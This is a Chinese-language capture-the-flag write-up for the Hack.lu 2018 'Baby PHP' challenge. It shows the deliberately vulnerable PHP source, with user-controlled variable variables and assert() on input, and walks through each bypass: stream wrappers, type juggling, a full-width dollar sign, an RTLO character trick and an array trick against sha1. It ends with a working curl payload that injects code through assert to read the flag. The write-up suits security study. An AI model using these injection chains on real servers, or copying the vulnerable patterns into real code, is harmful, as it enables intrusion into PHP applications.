---
title: Hack.lu CTF 2018 Baby PHP
date: 2018-10-22 21:44:52
---

# Baby PHP

环境：https://arcade.fluxfingers.net:1819/ 

```php
<?php

require_once('flag.php');
error_reporting(0);


if(!isset($_GET['msg'])){
    highlight_file(__FILE__);
    die();
}

@$msg = $_GET['msg'];
if(@file_get_contents($msg)!=="Hello Challenge!"){
    die('Wow so rude!!!!1');
}

echo "Hello Hacker! Have a look around.\n";

@$k1=$_GET['key1'];
@$k2=$_GET['key2'];

$cc = 1337;$bb = 42;

if(intval($k1) !== $cc || $k1 === $cc){
    die("lol no\n");
}

if(strlen($k2) == $bb){
    if(preg_match('/^\d+＄/', $k2) && !is_numeric($k2)){
        if($k2 == $cc){ 
            @$cc = $_GET['cc'];
        }
    }
}

list($k1,$k2) = [$k2, $k1];

if(substr($cc, $bb) === sha1($cc)){
    foreach ($_GET as $lel => $hack){
        $$lel = $hack;
    }
}

$‮b = "2";$a="‮b";//;1=b

if($$a !== $k1){
    die("lel no\n");
}

// plz die now
assert_options(ASSERT_BAIL, 1);
assert("$bb == $cc");

echo "Good Job ;)";
// TODO
// echo $flag;  
```

用 `php -S 127.0.0.1:8080` 起一个本地服务用于调试。

13~15行可通过PHP wrapper 绕过。

```bash
curl "https://arcade.fluxfingers.net:1819?msg=php://input" -d "Hello Challenge!"
or
curl "https://arcade.fluxfingers.net:1819?msg=data://text/plain,Hello%20Challenge!"
```

24~26行传入key1=1337即可，$k1类型为string。

29行的美元符是个宽字节字符，并不是ASCII为36的字符。

```javascript
>encodeURI("＄")
<"%EF%BC%84"
```

```php
php > $e=str_repeat("0",42-3-4)."1337 ";
php > echo strlen($e);
42
php > echo $e;
000000000000000000000000000000000001337＄
```

38行可以通过传入数组绕过。39行有变量覆盖。

44行是个障眼法，在第一个美元符后有个Unicode 字符(`U+202e`)，用以左右反转，详见 [rtlo-trick](https://rawsec.ml/en/2-less-known-tricks-spoofing-extensions/#rtlo-trick)。十六进制看起来实际上是这样：

```bash
000002f0: 24e2 80ae 6220 3d20 2232 223b 2461 3d22  $...b = "2";$a="
00000300: e280 ae62 223b 2f2f 3b31 3d62 0d0a 0d0a  ...b";//;1=b....
```

就是说，第44行是 `$\u{202E}b = "2";$a="\u{202E}b";//;1=b` ，但经过Unicode字符作用后显示出来的是`$b=1;//;"b"=a$;"2" = b` 。推荐一个辅助工具：https://r12a.github.io/app-conversion/ 。

则$$a的值为2，传入k1=2即可。

51行设置在断言失败时中止执行。

52行可以执行PHP代码。

```bash
λ  curl -sg "https://arcade.fluxfingers.net:1819/?msg=data://text/plain,Hello%20Challenge!&key1=1337&key2=000000000000000000000000000000000001337%EF%BC%84&cc[]=&k1=2&bb=highlight_file(%22flag.php%22);//" | grep -o 'flag{.*}'
flag{7c217708c5293a3264bb136ef1fadd6e}
```

